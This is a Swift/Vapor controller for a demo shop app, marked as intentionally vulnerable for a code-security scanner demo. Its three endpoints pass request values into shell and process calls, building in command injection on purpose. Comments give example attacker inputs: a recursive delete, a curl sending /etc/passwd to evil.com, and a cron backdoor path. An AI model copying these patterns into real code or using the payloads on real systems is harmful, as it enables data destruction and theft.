// FileOperations.swift
// Shopist – Product asset conversion and archive utilities
// ⚠️  DEMO FILE – Intentionally vulnerable for Datadog Code Security demo
// DO NOT USE IN PRODUCTION

import Foundation
import Vapor

struct FileOperationsController: RouteCollection {

    func boot(routes: RoutesBuilder) throws {
        let ops = routes.grouped("file-ops")
        ops.post("convert", use: convertImage)
        ops.post("archive", use: createArchive)
        ops.post("thumbnail", use: generateThumbnail)
    }

    // VULN 1: Command Injection via Process arguments containing user-controlled values
    // `inputFile` and `format` come from the request; they are interpolated into a
    // shell -c argument string, letting an attacker inject arbitrary commands with
    // characters like `;`, `|`, `$(...)`, or backticks.
    func convertImage(req: Request) throws -> Response {
        struct ConvertRequest: Content {
            var inputFile: String   // e.g., "product_photo.jpg"
            var format: String      // e.g., "png"
        }
        let body = try req.content.decode(ConvertRequest.self)

        // Attacker input for format: "png; rm -rf /var/shopist/uploads"
        let process = Process()
        process.launchPath = "/bin/sh"
        process.arguments = ["-c", "convert \(body.inputFile) output.\(body.format)"]
        try process.run()
        process.waitUntilExit()

        return Response(status: .ok, body: .init(string: "Conversion complete"))
    }

    // VULN 2: Command Injection via shell function with string interpolation
    // `archiveName` and `directory` are user-supplied strings passed to a shell helper.
    // The helper wraps them in a /bin/sh -c invocation, so shell metacharacters are
    // interpreted by the shell.
    func createArchive(req: Request) throws -> Response {
        struct ArchiveRequest: Content {
            var archiveName: String   // e.g., "products_backup"
            var directory: String     // e.g., "uploads/products"
        }
        let body = try req.content.decode(ArchiveRequest.self)

        // Attacker input for directory: "uploads/products; curl http://evil.com/$(cat /etc/passwd)"
        @discardableResult
        func shell(_ command: String) -> Int32 {
            let process = Process()
            process.launchPath = "/bin/sh"
            process.arguments = ["-c", command]
            try? process.run()
            process.waitUntilExit()
            return process.terminationStatus
        }

        shell("zip -r \(body.archiveName).zip \(body.directory)")

        return Response(status: .ok, body: .init(string: "Archive created: \(body.archiveName).zip"))
    }

    // VULN 3: Command Injection via user-controlled Process argument without sanitization
    // The `productId` query param is appended to a Process arguments array. Even without
    // a shell interpreter the argument is passed verbatim to the tool, which may perform
    // its own shell expansion, or the attacker may use whitespace splitting quirks.
    func generateThumbnail(req: Request) throws -> Response {
        guard let productId = req.query[String.self, at: "productId"],
              let size = req.query[String.self, at: "size"] else {
            throw Abort(.badRequest, reason: "Missing productId or size")
        }

        // Attacker input for productId: "12345 --output /etc/cron.d/backdoor"
        let inputPath = "/var/shopist/uploads/products/\(productId)/original.jpg"
        let outputPath = "/var/shopist/uploads/products/\(productId)/thumb_\(size).jpg"

        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/local/bin/convert")
        process.arguments = [inputPath, "-thumbnail", size, outputPath]
        try process.run()
        process.waitUntilExit()

        return Response(status: .ok, body: .init(string: "Thumbnail generated"))
    }
}
